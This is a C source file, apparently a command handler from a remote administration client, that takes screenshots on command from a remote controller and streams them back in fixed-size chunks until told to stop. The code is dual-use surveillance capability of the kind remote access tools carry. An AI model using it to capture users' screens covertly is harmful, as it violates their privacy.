#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "screenshot.h"

#define SERV_SCREENCAP_MAX_DATA 1980
#define SERV_SCREENCAP_CMD_DATA 0x1
#define SERV_SCREENCAP_END 0x2
#define SERV_SCREENCAP_GOOD 0x3
#define SERV_SCREENCAP_FAILED 0xF
#define SERV_SCREENCAP_STOP 0xBC

typedef struct _serv_screencap_data
{
	uint16 len;
	uint8 data[SERV_SCREENCAP_MAX_DATA];
}SERV_SCREENCAP_DATA;

typedef struct _serv_screencap_info
{
	uint32 width;
	uint32 height;
	uint32 timer;
}SERV_SCREENCAP_INFO;

int cmds_SCREENCAP(uint8* msg)
{
	SERV_SCREENCAP_INFO* sinfo = (SERV_SCREENCAP_INFO*)msg;
	SERV_SCREENCAP_INFO rsinfo;
	memset(&rsinfo, 0, sizeof(SERV_SCREENCAP_INFO));

	if(!screenshot_Calculate(&rsinfo.width, &rsinfo.height, sinfo->width, sinfo->height))
	{
		if(net_SendEmptyCmd(SERV_SCREENCAP_FAILED) < 1)
		{
			return 0;
		}

		return 1;
	}

	if(net_SendCmd((uint8*)&rsinfo, sizeof(SERV_SCREENCAP_INFO), CMDS_SCREEN_CAP) < 1)
	{
		return 0;
	}

	uint8* rmsg;
	uint8* scData;
	uint32 scSize;

	net_SetBuffer(NET_DATA_BUFFSIZE);

	while(1)
	{
		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			return 0;
		}

		if(rmsg[0] == SERV_SCREENCAP_STOP)
		{
			free(rmsg);

			break;
		}

		if(!(scSize = screenshot_Take(sinfo->width, sinfo->height, &scData)))
		{
			if(net_SendEmptyCmd(SERV_SCREENCAP_FAILED) < 1)
			{
				return 0;
			}
	
			return 1;
		}

		if(!scData)
		{
			if(net_SendEmptyCmd(SERV_SCREENCAP_FAILED) < 1)
			{
				return 0;
			}
	
			return 1;
		}

		int dataBuffLen = SERV_SCREENCAP_MAX_DATA;
		uint32 dataI = 0;

		if(dataBuffLen > scSize)
		{
			dataBuffLen = scSize;
		}

		SERV_SCREENCAP_DATA snSData;

		while(1)
		{
			memset(&snSData, 0, sizeof(SERV_SCREENCAP_DATA));
			memcpy(&snSData.data, scData + dataI, dataBuffLen);
			snSData.len = dataBuffLen;

			if(net_SendCmd((uint8*)&snSData, sizeof(SERV_SCREENCAP_DATA), SERV_SCREENCAP_CMD_DATA) < 1)
			{
				free(scData);
	
				return 0;
			}
	
			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				free(scData);
	
				return 0;
			}
	
			free(rmsg);
	
			dataI += dataBuffLen;
	
			if(dataI >= scSize)
			{
				break;
			}
	
			if(scSize - dataI < dataBuffLen)
			{
				dataBuffLen = scSize - dataI;
			}
		}
	
		free(scData);

		if(net_SendEmptyCmd(SERV_SCREENCAP_END) < 1)
		{
			return 0;
		}
	}

	return 1;
}